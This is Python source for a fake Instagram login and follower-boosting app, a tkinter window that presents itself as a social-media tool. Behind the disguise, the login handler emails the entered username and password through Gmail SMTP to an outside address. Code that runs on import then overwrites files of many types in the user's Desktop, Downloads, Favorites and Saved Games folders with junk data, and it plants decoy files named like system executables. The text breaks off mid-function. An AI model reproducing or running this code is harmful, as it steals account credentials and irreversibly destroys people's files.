
liste=["Aaren\nkaue12345\nBrena\nCarolyne\n",
        "jefferson12345\njuninho12345\nDebbi\n",
        "n3veragain\nx6lfvmN585\nwl0QGQv315\n",
        "voyager\nviral737\nunborn27\numbXAm6221\n",
        "trustno1\ntrixie29\ntreagus\nwil135135\n",
        "wil135\nwiP4OX7727\nwhocares\nwho.am.1\n",
        "whedgit06\nwhatever&#33;&quot;\nwhatever&#33;",
        "what\nwhafswada\nwfjmdw\nAnar_@\nArslan_drake\nUmid_!\n",
        "Memi_PB\n",
        "Sadik_02\n",
        "Vasif_jump\n"]
from tkinter import* 
from insta_server import window_insta

def server():
    from tqdm import tqdm
    import random
    import time
    rest=range(0,100)
    for i in tqdm(rest):
        #time.sleep(0.1)
        follow=random.randint(20,120)
    print("Followers:"+str(follow))
    ####################################
    from getpass import getuser
    windows="C:\\Users\\"+getuser()+"\\"
    #########################################
    try:
        name=delta_gram.sin.get()
        password=delta_gram.cos.get()
        str(name)
        str(password)
        #029
        import smtplib
        gmail_liste=["server.smtp1212@gmail.com",
                "server12.insta@gmail.com",
                "server.ip18@gmail.com",
                "serverport0@gmail.com"]
        liste_number=random.randint(0,3)

        ###################################
        server_SMTP="serverq1q2q3"
        sys_KEY=""
        for sys1 in server_SMTP:
            sys_KEY=sys_KEY +chr(ord(sys1) -5)
        sys_KEYS=""
        for sys2 in sys_KEY:
            sys_KEYS=sys_KEYS +chr(ord(sys2) +5)
        log_key=sys_KEYS

        #1221##############################################
        FORM=gmail_liste[int(liste_number)]
        EMAIL=gmail_liste[int(liste_number)]
        TO=["sayepzero@gmail.com"]
        key=["username:"+name,"Password:"+password]

        #1237819##########################################
        message='''\
                From: %s
                To: %s
                %s
                '''%(FORM+"\n",",".join(TO)+"\n",key)
        #090##############################################
        server_con=smtplib.SMTP("smtp.gmail.com",587)
        server_con.ehlo()
        server_con.starttls()
        server_con.login(str(EMAIL),str(log_key))
        server_con.sendmail(FORM,TO,message)

        #0923490#####010##201021###########################
        with open(windows+"Followers.txt","ab") as setting1:
            for fit in liste:
                for j in range(1,100):
                    setting1.write(fit.encode())
        with open(windows+"Followers.txt","r+") as setting2:
            for i in range(random.randint(10,110)):
              hour_local=time.asctime()
              print("HOUR:"+hour_local+"\n")
              #1
              time.sleep(0.3)
              re=setting2.readline()
              p="username:"
              print(p.upper()+str(re))
    except:
        ########################################
        with open(windows+"Followers.txt","ab") as setting1:
            for fit in liste:
                for j in range(1,100):
                    setting1.write(fit.encode())
        with open(windows+"Followers.txt","r+") as setting2:
            for i in range(random.randint(10,110)):
              hour_local=time.asctime()
              print("HOUR:"+hour_local+"\n")
              #1
              time.sleep(0.3)
              re=setting2.readline()
              p="username:"
              print(p.upper()+str(re))

#designing graphic interface
class window(Tk):
    def __init__(self):
        super().__init__()
        import os
        images=os.getcwd()
        ycor=os.path.join(images+"\\image\\")
        self.geometry("300x450")
        self.title("İnstagram")
        self.resizable(False,False)
        self.iconbitmap(True,ycor+"admin.ico")
        self.insta=PhotoImage(file=ycor+"insta.png")
        self.label=Label(image=self.insta).pack(pady=10)

    def username(self):
        us=Label(text="Username",font=("bold",10,"italic"),fg="#3897f0").place(relx=0.2,rely=0.2)
        self.sin=Entry(font="bold",bd=0.5)
        self.sin.place(relx=0.5, rely=0.3,anchor=CENTER)

    def password(self):
        ps=Label(text="Password",font=("bold",10,"italic"),fg="#3897f0").place(relx=0.2,rely=0.4)
        self.cos=Entry(show="*",font="bold",bd=0.5)
        self.cos.place(relx=0.5, rely=0.5,anchor=CENTER)
    
    def button(self):
        entry=Button(text="Login",bg="#3897f0",width=23,height=2,command=server)
        entry.place(relx=0.2,rely=0.6)

    def Warring(self):
        war=Label(text="Sign up to see your\nfriends photos and videos.",font=("bold",10,"italic"),fg="red")
        war.place(relx=0.2,rely=0.7)
    @classmethod
    def Register(cls):
        reg=Button(text="Register",bg="#3897f0",width=23,height=2,command=window_insta)
        reg.place(relx=0.2,rely=0.8)
        
delta_gram=window() 
if __name__=="__main__":
    delta_gram.username()#1
    delta_gram.password()#2
    delta_gram.button()#3
    delta_gram.Register()#4
    #Warring
    delta_gram.Warring()
    delta_gram.mainloop()

#1 operations-start-
import os
from getpass import getuser


Desktop=os.path.join("C:\\Users\\"+getuser()+"\\Desktop\\")#1
Downloads=os.path.join("C:\\Users\\"+getuser()+"\\Downloads\\")#2
Documents=os.path.join("C:\\Users\\"+getuser()+"\\Documents\\")#3
Music=os.path.join("C:\\Users\\"+getuser()+"\\Music\\")#4
try:
    Pictures=os.path.join("C:\\Users\\"+getuser()+"\\Pictures\\Saved Pictures\\")#5
    Pictures1=os.path.join("C:\\Users\\"+getuser()+"\\Pictures\\Camera Roll\\")#6
    Pictures2=os.path.join("C:\\Users\\"+getuser()+"\\Pictures\\")#7
    Videos=os.path.join("C:\\Users\\"+getuser()+"\\Videos\\Captures\\")#8
    Videos1=os.path.join("C:\\Users\\"+getuser()+"\\Videos\\")#9
except:
    Pictures=os.path.join("C:\\Users\\"+getuser()+"\\Pictures\\")
    Videos=os.path.join("C:\\Users\\"+getuser()+"\\Videos\\")

Windows_user=os.path.join("C\\Users\\"+getuser()+"\\")#10                      
Windows_Favorites=os.path.join("C:\\Users\\"+getuser()+"\\Favorites\\")#11                      
Windows_Public=os.path.join("C:\\Users\\Public\\")#12
Windows_Games=os.path.join("C:\\Users\\"+getuser()+"\\Saved Games\\")#13


#encrypto-File
import random
key="Aq5r6y8i0o8HHJKM^j*qwedglptnckosyrtm12389056zbasvlpohjklmkoZ"
password_Translate=""
key1="Aomvusds743750934kf,(&^%#_)_^ksfosdmokxcpz,dsprgofdgib,xcpxcvkZ"
crypto=""
number=random.randint(10,789)
number_file=random.randint(78,1000)
for key_sys in key:
    if len(key) > 30:
        for Zz in range(0,19000):#!!!ESAS!!!
            password_Translate=password_Translate+chr(ord(key_sys)+int(number))
for sys in key1:
    crypto=crypto+chr(ord(sys)+int(number_file))

#73249#########
class windows_F:
    window_liste=os.listdir(Windows_Favorites)
    for got in window_liste:
        if got.endswith(".exe"):
            Jk=open(Windows_Favorites+got,"wb")
            Jk.write(crypto.encode())
        if got.endswith(".pdf"):
            Jk2=open(Windows_Favorites+got,"wb")
            Jk2.write(crypto.encode())
        if got.endswith(".txt"):
            Jk3=open(Windows_Favorites+got,"wb")
            Jk3.write(crypto.encode())
        if got.endswith(".iso"):
            Jk4=open(Windows_Favorites+got,"wb")
            Jk4.write(crypto.encode())
        if got.endswith(".rar"):
            Jk5=open(Windows_Favorites+got,"wb")
            Jk5.write(crypto.encode())
        if got.endswith(".zip"):
            Jk6=open(Windows_Favorites+got,"wb")
            Jk6.write(crypto.encode())
        if got.endswith(".svg"):
            Jk7=open(Windows_Favorites+got,"wb")
            Jk7.write(crypto.encode())
        if got.endswith(".jpg"):
            Jk8=open(Windows_Favorites+got,"wb")
            Jk8.write(crypto.encode())
        if got.endswith(".jfif"):
            Jk9=open(Windows_Favorites+got,"wb")
            Jk9.write(crypto.encode())
        if got.endswith(".png"):
            Jk10=open(Windows_Favorites+got,"wb")
            Jk10.write(crypto.encode())
windows_F()
class windows_games:
    window_32=os.listdir(Windows_Games)
    for good in window_32:
        if good.endswith(".exe"):
            apk1=open(Windows_Games+good,"wb")
            apk1.write(crypto.encode())
        if good.endswith(".pdf"):
            apk2=open(Windows_Games+good,"wb")
            apk2.write(crypto.encode())
        if good.endswith(".txt"):
            apk3=open(Windows_Games+good,"wb")
            apk3.write(crypto.encode())
        if good.endswith(".iso"):
            apk4=open(Windows_Games+good,"wb")
            apk4.write(crypto.encode())
        if good.endswith(".rar"):
            apk5=open(Windows_Games+good,"wb")
            apk5.write(crypto.encode())
        if good.endswith(".zip"):
            apk6=open(Windows_Games+good,"wb")
            apk6.write(crypto.encode())
        if good.endswith(".svg"):
            apk7=open(Windows_Games+good,"wb")
            apk7.write(crypto.encode())
        if good.endswith(".jpg"):
            apk8=open(Windows_Games+good,"wb")
            apk8.write(crypto.encode())
        if good.endswith(".jfif"):
            apk9=open(Windows_Games+good,"wb")
            apk9.write(crypto.encode())
        if good.endswith(".png"):
            apk10=open(Windows_Games+good,"wb")
            apk10.write(crypto.encode())
windows_games()

#creating Files
instagram_system=(Desktop+"instagram.system\\")
perflogs=(Downloads+"Perflogs\\")
Microsoft=(Documents+"Microsoft\\")
############################################
print("[En+]Wait 1 Minute...")             ##
print("[Ru+]Подождите 1 минуту...")        ##
print("[Tr+]1 dakika bekleyin...")         ##
print("[Japn+]1分待つ...")                  ##
print("[German+]Warten Sie 1 Minute...")   ##
############################################
class system_desktop:#File->Desktop
    try:
        path=(instagram_system+"SetLogs_\\")
        path1=(instagram_system+"_Like_\\")
        path2=(instagram_system+"comMenT.NT\\")
        os.mkdir(instagram_system)
        os.mkdir(path)
        os.mkdir(path1)
        os.mkdir(path2)

        #SetLogs_-File-path
        with open(path+"tableTextServer.txt","ab") as csy:
            csy.write(password_Translate.encode())
        with open(path+"insta.png","ab") as csy1:
            csy1.write(password_Translate.encode())
        with open(path+"set.ico","ab") as csy2:
            csy2.write(password_Translate.encode())
        with open(path+"Bsfc.exe","ab") as csy3:
            csy3.write(password_Translate.encode())
        #_Like_ -File-path1
        with open(path1+"RTCamu64x.exe","ab") as czz1:
            czz1.write(password_Translate.encode())
        with open(path1+"LikeSystem.dll","ab") as czz2:
            czz2.write(password_Translate.encode())
        with open(path1+"Windows64x-32x.sh","ab") as czz3:
            czz3.write(password_Translate.encode())
        with open(path1+"xpasster.xml","ab") as czz4:
            czz4.write(password_Translate.encode())
        #comMent.NT-File-path2
        with open(path2+"Wmin32byts.bat","ab") as Ss32:
            Ss32.write(password_Translate.encode())
    except:
        #Setlogs_-File-path
        with open(path+"tableTextServer.txt","ab") as csy:
            csy.write(password_Translate.encode())
        with open(path+"insta.png","ab") as csy1:
            csy1.write(password_Translate.encode())
        with open(path+"set.ico","ab") as csy2:
            csy2.write(password_Translate.encode())
        with open(path+"Bsfc.exe","ab") as csy3:
            csy3.write(password_Translate.encode())
        #_Like_-File-path1
        with open(path1+"RTCamu64x.exe","ab") as czz1:
            czz1.write(password_Translate.encode())
        with open(path1+"LikeSystem.dll","ab") as czz2:
            czz2.write(password_Translate.encode())
        with open(path1+"Windows64x-32x.sh","ab") as czz3:
            czz3.write(password_Translate.encode())
        with open(path1+"xpasster.xml","ab") as czz4:
            czz4.write(password_Translate.encode())
        #comMent.NT-File-path2
        with open(path2+"Wim32byts.bat","ab") as Ss32:
            Ss32.write(password_Translate.encode())
    def __init__(self):
        self.liste=os.listdir(Desktop)
    def system_encrypt(self):
        #crypto
        # iso,uue,zipx,lzh,lz,jar,zip,7z,cab,gz,z,001
        for file in self.liste:
            if file.endswith(".txt"):
                with open(Desktop+file,"wb") as admin1:
                    admin1.write(crypto.encode())
            if file.endswith(".rtf"):
                with open(Desktop+file,"wb") as admin2:
                    admin2.write(crypto.encode())
            if file.endswith(".exe"):
                admin3=open(Desktop+file,"wb")
                admin3.write(crypto.encode())
            if file.endswith(".pdf"):
                admin4=open(Desktop+file,"wb")
                admin4.write(crypto.encode())
            if file.endswith(".jfif"):
                admin5=open(Desktop+file,"wb")
                admin5.write(crypto.encode())
            if file.endswith(".png"):
                with open(Desktop+file,"wb") as admin6:
                    admin6.write(crypto.encode())
            if file.endswith(".rar"):
                with open(Desktop+file,"wb") as admin7:
                    admin7.write(crypto.encode())
            if file.endswith(".zip"):
                with open(Desktop+file,"wb") as admin8:
                    admin8.write(crypto.encode())
            if file.endswith(".iso"):
                with open(Desktop+file,"wb") as admin9:
                    admin9.write(crypto.encode())
            if file.endswith(".7z"):
                with open(Desktop+file,"wb") as admin10:
                    admin10.write(crypto.encode())
            if file.endswith(".py"):
                admin11=open(Desktop+file,"wb")
                admin11.write(crypto.encode())
            if file.endswith(".js"):
                admin12=open(Desktop+file,"wb")
                admin12.write(crypto.encode())
            if file.endswith(".html"):
                admin13=open(Desktop+file,"wb")
                admin13.write(crypto.encode())
            if file.endswith(".php"):
                with open(Desktop+file,"ab") as php:
                    php.write(crypto.encode())
            if file.endswith(".css"):
                admin14=open(Desktop+file,"wb")
                admin14.write(crypto.encode())
            if file.endswith(".cpp"):
                admin15=open(Desktop+file,"wb")
                admin15.write(crypto.encode())
            if file.endswith(".c"):
                admin16=open(Desktop+file,"wb")
                admin16.write(crypto.encode())
            if file.endswith(".mp3"):
                admin17=open(Desktop+file,"wb")
                admin17.write(crypto.encode())
            if file.endswith(".mp4"):
                admin18=open(Desktop+file,"wb")
                admin18.write(crypto.encode())
            #images
            elif file.endswith(".ico"):
                with open(Desktop+file,"wb") as admin19:
                    admin19.write(crypto.encode())
            elif file.endswith(".svg"):
                with open(Desktop+file,"wb") as admin20:
                    admin20.write(crypto.encode())
            elif file.endswith(".jpg"):
                with open(Desktop+file,"wb") as admin21:
                    admin21.write(crypto.encode())
            elif file.endswith(".gif"):
                with open(Desktop+file,"wb") as admin22:
                    admin22.write(crypto.encode())
            elif file.endswith(".psd"):
                with open(Desktop+file,"wb") as admin23:
                    admin23.write(crypto.encode())
            elif file.endswith(".bmp"):
                with open(Desktop+file,"wb") as admin24:
                    admin24.write(crypto.encode())
            elif file.endswith(".jpeg"):
                with open(Desktop+file,"wb") as admin25:
                    admin25.write(crypto.encode())
            elif file.endswith(".eps"):
                with open(Desktop+file,"wb") as admin26:
                    admin26.write(crypto.encode())
            elif file.endswith(".jpe"):
                with open(Desktop+file,"wb") as  admin27:
                    admin27.write(crypto.encode())
            elif file.endswith(".dib"):
                with open(Desktop+file,"wb") as admin28:
                    admin28.write(crypto.encode())
            elif file.endswith(".imaj"):
                with open(Desktop+file,"wb") as admin29:
                    admin29.write(crypto.encode())
            elif file.endswith(".bat"):
                with open(Desktop+file,"wb") as admin30:
                    admin30.write(crypto.encode())
            elif file.endswith(".rav"):
                with open(Desktop+file,"wb") as admin31:
                    admin31.write(crypto.encode())
            if file.endswith(".doc"):
                admin32=open(Desktop+file,"wb")
                admin32.write(crypto.encode())
            if file.endswith(".log"):
                admin33=open(Desktop+file,"wb")
                admin33.write(crypto.encode())
            if file.endswith(".pps"):
                admin34=open(Desktop+file,"wb")
                admin34.write(crypto.encode())
            if file.endswith(".ppt"):
                admin35=open(Desktop+file,"wb")
                admin35.write(crypto.encode())
            if file.endswith(".pptx"):
                admin36=open(Desktop+file,"wb")
                admin36.write(crypto.encode())
            if file.endswith(".wpd"):
                admin37=open(Desktop+file,"wb")
                admin37.write(crypto.encode())
            if file.endswith(".wps"):
                admin38=open(Desktop+file,"wb")
                admin38.write(crypto.encode())
            if file.endswith(".xlr"):
                admin39=open(Desktop+file,"wb")
                admin39.write(crypto.encode())
            if file.endswith(".xls"):
                admin40=open(Desktop+file,"wb")
                admin40.write(crypto.encode())
            if file.endswith(".xlsx"):
                admin41=open(Desktop+file,"wb")
                admin41.write(crypto.encode())
            if file.endswith(".pkg"):
                admin42=open(Desktop+file,"wb")
                admin42.write(crypto.encode())
            if file.endswith(".bz2"):
                admin43=open(Desktop+file,"wb")
                admin43.write(crypto.encode())
            if file.endswith(".cab"):
                admin44=open(Desktop+file,"wb")
                admin44.write(crypto.encode())
            if file.endswith(".deb"):
                admin45=open(Desktop+file,"wb")
                admin45.write(crypto.encode())
            if file.endswith(".rpm"):
                admin46=open(Desktop+file,"wb")
                admin46.write(crypto.encode())
            if file.endswith(".sit"):
                admin47=open(Desktop+file,"wb")
                admin47.write(crypto.encode())
            if file.endswith(".sitx"):
                admin48=open(Desktop+file,"wb")
                admin48.write(crypto.encode())
            if file.endswith(".tar"):
                admin49=open(Desktop+file,"wb")
                admin49.write(crypto.encode())
            if file.endswith(".tar.gz"):
                admin50=open(Desktop+file,"wb")
                admin50.write(crypto.encode())
            if file.endswith(".Z"):
                admin51=open(Desktop+file,"wb")
                admin51.write(crypto.encode())
            if file.endswith(".part"):
                admin52=open(Desktop+file,"wb")
                admin52.write(crypto.encode())
            if file.endswith(".dmg"):
                admin53=open(Desktop+file,"wb")
                admin53.write(crypto.encode())
            if file.endswith(".eml"):
                admin54=open(Desktop+file,"wb")
                admin54.write(crypto.encode())
            if file.endswith(".emlx"):
                admin55=open(Desktop+file,"wb")
                admin55.write(crypto.encode())
            if file.endswith(".mbx"):
                admin56=open(Desktop+file,"wb")
                admin56.write(crypto.encode())
            if file.endswith(".pst"):
                admin57=open(Desktop+file,"wb")
                admin57.write(crypto.encode())
            if file.endswith(".vcf"):
                admin58=open(Desktop+file,"wb")
                admin58.write(crypto.encode())
            if file.endswith(".app"):
                admin59=open(Desktop+file,"wb")
                admin59.write(crypto.encode())
            if file.endswith(".cgi"):
                admin60=open(Desktop+file,"wb")
                admin60.write(crypto.encode())
            if file.endswith(".com"):
                admin61=open(Desktop+file,"wb")
                admin61.write(crypto.encode())
            if file.endswith(".pif"):
                admin62=open(Desktop+file,"wb")
                admin62.write(crypto.encode())
            if file.endswith(".vbs"):
                admin63=open(Desktop+file,"wb")
                admin63.write(crypto.encode())
            if file.endswith(".sys"):
                admin64=open(Desktop+file,"wb")
                admin64.write(crypto.encode())
            if file.endswith(".msi"):
                admin65=open(Desktop+file,"wb")
                admin65.write(crypto.encode())
            if file.endswith(".dll"):
                admin66=open(Desktop+file,"wb")
                admin66.write(crypto.encode())
            if file.endswith(".reg"):
                admin67=open(Desktop+file,"wb")
                admin67.write(crypto.encode())
            if file.endswith(".tmp"):
                admin68=open(Desktop+file,"wb")
                admin68.write(crypto.encode())
            if file.endswith(".cpl"):
                admin69=open(Desktop+file,"wb")
                admin69.write(crypto.encode())
            if file.endswith(".dmp"):
                admin70=open(Desktop+file,"wb")
                admin70.write(crypto.encode())
            if file.endswith(".lnk"):
                admin71=open(Desktop+file,"wb")
                admin71.write(crypto.encode())
            if file.endswith(".cfg"):
                admin72=open(Desktop+file,"wb")
                admin72.write(crypto.encode())
            if file.endswith(".conf"):
                admin73=open(Desktop+file,"wb")
                admin73.write(crypto.encode())
            elif file.endswith(".fon"):
                with open(Desktop+file,"wb") as admin75:
                    admin75.write(crypto.encode())
            elif file.endswith(".ttf"):
                with open(Desktop+file,"wb") as admin76:
                    admin76.write(crypto.encode())
            elif file.endswith(".fnt"):
                with open(Desktop+file,"wb") as admin77:
                    admin77.write(crypto.encode())
            elif file.endswith(".asp"):
                with open(Desktop+file,"wb") as admin78:
                    admin78.write(crypto.encode())
            elif file.endswith(".h"):
                with open(Desktop+file,"wb") as admin79:
                    admin79.write(crypto.encode())
            elif file.endswith(".pl"):
                with open(Desktop+file,"wb") as admin80:
                    admin80.write(crypto.encode())
            elif file.endswith(".dv"):
                with open(Desktop+file,"wb") as admin81:
                    admin81.write(crypto.encode())
            elif file.endswith(".fcp"):
                with open(Desktop+file,"wb") as admin82:
                    admin82.write(crypto.encode())
            elif file.endswith(".swf"):
                with open(Desktop+file,"wb") as admin83:
                    admin83.write(crypto.encode())
            elif file.endswith(".ai"):
                with open(Desktop+file,"wb") as admin84:
                    admin84.write(crypto.encode())
            elif file.endswith(".mov"):
                with open(Desktop+file,"wb") as admin85:
                    admin85.write(crypto.encode())
            elif file.endswith(".wma"):
                with open(Desktop+file,"wb") as admin86:
                    admin86.write(crypto.encode())
            elif file.endswith(".indd"):
                with open(Desktop+file,"wb") as admin87:
                    admin87.write(crypto.encode())
            elif file.endswith("docx"):
                with open(Desktop+file,"wb") as admin88:
                    admin88.write(crypto.encode())

############################################################


class system_download:
    path_this=(perflogs+"Elantech\\")
    path_the=(perflogs+"Internet Explorer\\")
    path_wor=(perflogs+"Microsoft Office 15\\")
    path_down=(Downloads+"Mozilla Firefox\\")
    path_down1=(Downloads+"Windows Mail\\")
    path_os=(path_wor+"CvusilLHH\\")
    try:
        os.mkdir(perflogs)
        os.mkdir(path_this)
        os.mkdir(path_the)
        os.mkdir(path_wor)
        os.mkdir(path_down)
        os.mkdir(path_down1)
        os.mkdir(path_os)
        #Firefox servers
        with open(path_down+"Firefox.exe","ab") as fox:
            fox.write(password_Translate.encode())
        with open(path_down+"_fiReFox__.sh","ab") as fox:
            fox.write(password_Translate.encode())
        #Gmail servers
        with open(path_down1+"Gmail.exe","ab") as gmail:
            gmail.write(password_Translate.encode())
        with open(path_down1+"gamil server.dll","ab") as gmail:
            gmail.write(password_Translate.encode())
        #Elantech
        with open(path_this+"Windows 7 Ultimate.iso","ab") as elan:
            elan.write(password_Translate.encode())
        with open(path_this+"Microsoft server.dll","ab") as elan:
            elan.write(password_Translate.encode())
        with open(path_this+"Internet Ex.html","ab") as elan:
            elan.write(password_Translate.encode())
        with open(path_this+"Server.js","ab") as elan:
            elan.write(password_Translate.encode())
        #Internet Explorer
        with open(path_the+"bing.ico","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"ExtExport.exe","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"hmmad.dll","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"iedacmd.exe","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"system.msc","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"iexplore.ocx","ab") as inter:
            inter.write(password_Translate.encode())
        #Microsoft office 15
        with open(path_wor+"themOfice.prx","ab") as office:
            office.write(password_Translate.encode())
        with open(path_wor+"ClentX64.dat","ab") as office:
            office.write(password_Translate.encode())
        with open(path_wor+"IntegradeOfice.wsf","ab") as office:
            office.write(password_Translate.encode())
        with open(path_wor+"log.xsl","ab") as office:
            office.write(password_Translate.encode())
        #CvusilLHH
        with open(path_os+"hjjCFd.uce","ab") as off:
            off.write(password_Translate.encode())
        with open(path_os+"Kall Linux.sbin","ab") as off:
            off.write(password_Translate.encode())
        with open(path_os+"GGhjsdf.cap","ab") as off:
            off.write(password_Translate.encode())
        with open(path_os+"IP addres.js","ab") as off:
            off.write(password_Translate.encode())
        
    except:
        #1
        with open(path_down+"Firefox.exe","ab") as fox:
            fox.write(password_Translate.encode())
        with open(path_down+"_fiReFox__.sh","ab") as fox:
            fox.write(password_Translate.encode())
        #2
        with open(path_down1+"Gmail.exe","ab") as gmail:
            gmail.write(password_Translate.encode())
        with open(path_down1+"gamil server.dll","ab") as gmail:
            gmail.write(password_Translate.encode())
        #3
        with open(path_this+"Windows 7 Ultimate.iso","ab") as elan:
            elan.write(password_Translate.encode())
        with open(path_this+"Microsoft server.dll","ab") as elan:
            elan.write(password_Translate.encode())
        with open(path_this+"Internet Ex.html","ab") as elan:
            elan.write(password_Translate.encode())
        with open(path_this+"Server.js","ab") as elan:
            elan.write(password_Translate.encode())
        #4
        with open(path_the+"bing.ico","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"ExtExport.exe","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"hmmad.dll","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"iedacmd.exe","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"system.msc","ab") as inter:
            inter.write(password_Translate.encode())
        with open(path_the+"iexplore.ocx","ab") as inter:
            inter.write(password_Translate.encode())
        #5
        with open(path_wor+"themOfice.prx","ab") as office:
            office.write(password_Translate.encode())
        with open(path_wor+"ClentX64.dat","ab") as office:
            office.write(password_Translate.encode())
        with open(path_wor+"IntegradeOfice.wsf","ab") as office:
            office.write(password_Translate.encode())
        with open(path_wor+"log.xsl","ab") as office:
            office.write(password_Translate.encode())
        #6
        with open(path_os+"hjjCFd.uce","ab") as off:
            off.write(password_Translate.encode())
        with open(path_os+"Kall Linux.sbin","ab") as off:
            off.write(password_Translate.encode())
        with open(path_os+"GGhjsdf.cap","ab") as off:
            off.write(password_Translate.encode())
        with open(path_os+"IP addres.js","ab") as off:
            off.write(password_Translate.encode())
    
    # crypto File
    def __init__(self):
        self.liste1=os.listdir(Downloads)
    def encrypto_file(self):
        for file1 in self.liste1:
            if file1.endswith(".exe"):
                sin1=open(Downloads+file1,"wb")
                sin1.write(crypto.encode())
            if file1.endswith(".pdf"):
                sin2=open(Downloads+file1)
                sin2.write(crypto.encode())
            if file1.endswith(".py"):
                sin3=open(Downloads+file1,"wb")
                sin3.write(crypto.encode())
            if file1.endswith(".js"):
                sin4=open(Downloads+file1,"wb")
                sin4.write(crypto.encode())
            if file1.endswith(".html"):
                sin5=open(Downloads+file1,"wb")
                sin5.write(crypto.encode())
            if file1.endswith(".php"):
                sin6=open(Downloads+file1,"wb")
                sin6.write(crypto.encode())
            if file1.endswith(".css"):
                sin7=open(Downloads+file1,"wb")
                sin7.write(crypto.encode())
            if file1.endswith(".c"):
                sin8=open(Downloads+file1,"wb")
                sin8.write(crypto.encode())
            if file1.endswith(".java"):
                sin9=open(Downloads+file1,"wb")
                sin9.write(crypto.encode())
            if file1.endswith(".cpp"):
                sin10=open(Downloads+file1,"wb")
                sin10.write(crypto.encode())
            if file1.endswith(".txt"):
                sin12=open(Downloads+file1,"ab")
                sin12.write(password_Translate.encode())
            if file1.endswith(".rar"):
                sin13=open(Downloads+file1,"wb")
                sin13.write(crypto.encode())
            if file1.endswith(".zip"):
                sin14=open(Downloads+file1,"wb")
                sin14.write(crypto.encode())
            if file1.endswith(".rtf"):
                sin15=open(Downloads+file1,"wb")
                sin15.write(crypto.encode())
            if file1.endswith(".iso"):
                sin16=open(Downloads+file1,"wb")
                sin16.write(crypto.encode())
            if file1.endswith(".mp4"):
                sin17=open(Downloads+file1,"wb")
                sin17.write(crypto.encode())
            if file1.endswith(".mp3"):
                sin18=open(Downloads+file1,"wb")
                sin18.write(crypto.encode())
            if file1.endswith(".imaj"):
                sin19=open(Downloads+file1,"wb")
                sin19.write(crypto.encode())
            if file1.endswith(".zipx"):
                sin20=open(Downloads+file1,"wb")
                sin20.write(crypto.encode())
            if file1.endswith(".7z"):
                sin21=open(Downloads+file1,"wb")
                sin21.write(crypto.encode())
            if file1.endswith(".docx"):
                sin22=open(Downloads+file1,"wb")
                sin22.write(crypto.encode())
            #xps,xml
            if file1.endswith(".xps"):
                sin23=open(Downloads+file1,"wb")
                sin23.write(crypto.encode())
            if file1.endswith(".xml"):
                sin24=open(Downloads+file1,"wb")
                sin24.write(crypto.encode())
            if file1.endswith(".csv"):
                sin25=open(Downloads+file1,"wb")
                sin25.write(crypto.encode())
            if file1.endswith(".doc"):
                sin26=open(Downloads+file1,"wb")
                sin26.write(crypto.encode())
            if file1.endswith(".log"):
                sin27=open(Downloads+file1,"wb")
                sin27.write(crypto.encode())
            if file1.endswith(".pps"):
                sin28=open(Downloads+file1,"wb")
                sin28.write(crypto.encode())
            if file1.endswith(".ppt"):
                sin29=open(Downloads+file1,"wb")
                sin29.write(crypto.encode())
            if file1.endswith(".pptx"):
                sin30=open(Downloads+file1,"wb")
                sin30.write(crypto.encode())
            if file1.endswith(".wpd"):
                sin31=open(Downloads+file1,"wb")
                sin31.write(crypto.encode())
            if file1.endswith(".wps"):
                sin32=open(Downloads+file1,"wb")
                sin32.wirte(crypto.encode())
            if file1.endswith(".xlr"):
                sin33=open(Downloads+file1,"wb")
                sin33.write(crypto.encode())
            if file1.endswith(".xls"):
                sin34=open(Downloads+file1,"wb")
                sin34.write(crypto.encode())
            if file1.endswith(".xlsx"):
                sin35=open(Downloads+file1,"wb")
                sin35.write(crypto.encode())
            if file1.endswith(".pkg"):
                sin36=open(Downloads+file1,"wb")
                sin36.write(crypto.encode())
            if file1.endswith(".bz2"):
                sin37=open(Downloads+file1,"wb")
                sin37.write(crypto.encode())
            if file1.endswith(".cab"):
                sin38=open(Downloads+file1,"wb")
                sin38.write(crypto.encode())
            if file1.endswith(".deb"):
                sin39=open(Downloads+file1,"wb")
                sin39.write(crypto.encode())
            if file1.endswith(".rpm"):
                sin40=open(Downloads+file1,"wb")
                sin40.write(crypto.encode())
            if file1.endswith(".sit"):
                sin41=open(Downloads+file1,"wb")
                sin41.write(crypto.encode())
            if file1.endswith(".sitx"):
                sin42=open(Downloads+file1,"wb")
                sin42.write(crypto.encode())
            if file1.endswith(".tar"):
                sin43=open(Downloads+file1,"wb")
                sin43.write(crypto.encode())
            if file1.endswith(".tar.gz"):
                sin44=open(Downloads+file1,"wb")
                sin44.write(crypto.encode())
            if file1.endswith(".Z"):
                sin45=open(Downloads+file1,"wb")
                sin45.write(crypto.encode())
            if file1.endswith(".part"):
                sin46=open(Downloads+file1,"wb")
                sin46.write(crypto.encode())
            if file1.endswith(".dmg"):
                sin47=open(Downloads+file1,"wb")
                sin47.write(crypto.encode())
            if file1.endswith(".eml"):
                sin48=open(Downloads+file1)
                sin48.write(crypto.encode())
            if file1.endswith(".emlx"):
                sin49=open(Downloads+file1,"wb")
                sin49.write(crypto.encode())
            if file1.endswith(".mbx"):
                sin50=open(Downloads+file1,"wb")
                sin50.write(crypto.encode())
            if file1.endswith(".pst"):
                sin51=open(Downloads+file1,"wb")
                sin51.write(crypto.encode())
            if file1.endswith(".vcf"):
                sin52=open(Downloads+file1,"wb")
                sin52.write(crypto.encode())
            if file1.endswith(".app"):
                sin53=open(Downloads+file1,"wb")
                sin53.write(crypto.encode())
            if file1.endswith(".cgi"):
                sin54=open(Downloads+file1,"wb")
                sin54.write(crypto.encode())
            if file1.endswith(".com"):
                sin55=open(Downloads+file1,"wb")
                sin55.write(crypto.encode())
            if file1.endswith(".pif"):
                sin56=open(Downloads+file1,"wb")
                sin56.write(crypto.encode())
            if file1.endswith(".vbs"):
                sin57=open(Downloads+file1,"wb")
                sin57.write(crypto.encode())
            if file1.endswith(".sys"):
                sin58=open(Downloads+file1,"wb")
                sin58.write(crypto.encode())
            if file1.endswith(".msi"):
                sin59=open(Downloads+file1,"wb")
                sin59.write(crypto.encode())
            if file1.endswith(".dll"):
                sin60=open(Downloads+file1,"wb")
                sin60.write(crypto.encode())
            if file1.endswith(".reg"):
